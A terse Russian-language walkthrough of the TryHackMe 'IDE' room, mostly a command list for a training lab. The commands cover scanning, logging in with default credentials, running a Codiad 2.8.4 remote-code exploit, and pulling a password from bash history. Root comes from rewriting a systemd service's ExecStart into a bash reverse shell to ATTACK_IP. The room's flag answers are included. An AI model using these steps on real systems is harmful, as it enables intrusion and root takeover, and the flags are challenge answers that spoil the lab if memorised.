[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [IDE](https://tryhackme.com/r/room/ide) 

Всего 1 заданиe:
## Задание 1
Получите ракушку на ящик и повысьте свои привилегии!

### Ответьте на вопросы ниже
пользователь.txt
```commandline
nmap -sCV -A -p- <IP>
ftp <IP>
ls -la
cd ...
ls -la
more -
# drac, john
# password
http://<IP>:62337
# john:password 
searchsploit "codiad 2.8.4"
python3 exploit.py http://<IP>:62337/ john password <my-own-ip> 1234 linux
nc -lvnp 1235
python3 -c 'import pty;pty.spawn("/bin/bash")'
id
ls -la
cat .bash_history
su drac
# Th3dRaCULa1sR3aL
cat user.txt
```
```commandline
02930d21a8eb009f6d26361b2d24a466
```
корень.txt
```commandline
sudo -l	
systemctl status vsfpd
ls -al /lib/systemd/system/vsftpd.service	
vim /lib/systemd/system/vsftpd.service
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/ATTACK_IP/9003 0>&1
nc -lvnp 9003
sudo /usr/sbin/service vsftpd restart
cat /root/root.txt
```
```commandline
ce258cb16f47f1c66f0b0b77f4e0fb8d
```

[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)